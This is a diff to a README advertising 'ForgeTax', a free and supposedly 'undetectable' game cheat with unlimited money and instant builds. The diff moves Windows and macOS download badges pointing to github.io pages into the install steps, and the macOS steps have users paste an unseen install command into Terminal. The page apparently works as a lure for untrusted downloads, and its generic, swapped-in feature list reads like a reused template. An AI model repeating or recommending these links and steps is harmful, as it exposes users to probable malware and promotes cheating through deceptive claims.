@@ -15,11 +15,11 @@
 
 ## ✨ Features
 
-🎯 &nbsp;**Unlimited Gold**
-👁️ &nbsp;**God Mode**
-⚡ &nbsp;**Max Forging Skill**
-🔧 &nbsp;**Infinite Materials**
-🗺️ &nbsp;**Instant Craft**
+✅ &nbsp;**Unlimited Money**
+✅ &nbsp;**Max Resources**
+✅ &nbsp;**Instant Build**
+✅ &nbsp;**No Tax Penalty**
+✅ &nbsp;**Fast Research**
 
 ---
 
@@ -45,10 +45,14 @@
 5. 🎮 Launch **ForgeTax** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
+
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 **Menu Controls**
 
@@ -73,20 +77,6 @@
 
 ---
 
-## 📥 Download
-
-<p align="center">
-  <a href="https://beatowlrouse.github.io/windownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
-  </a>
-  &nbsp;&nbsp;
-  <a href="https://beatowlrouse.github.io/macdownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
-  </a>
-</p>
-
----
-
 ## ❓ FAQ
 
 **Is it really undetectable?**
@@ -97,11 +87,6 @@ Yes. Open Terminal, paste the install command from the macOS section above.
 
 **Is it free?**
 Completely free. No trials, no subscriptions.
-
-**Safety tips:**
-- Use alt accounts for initial testing
-- Keep the tool updated
-- Don't stream with the overlay visible
 
 ---
 
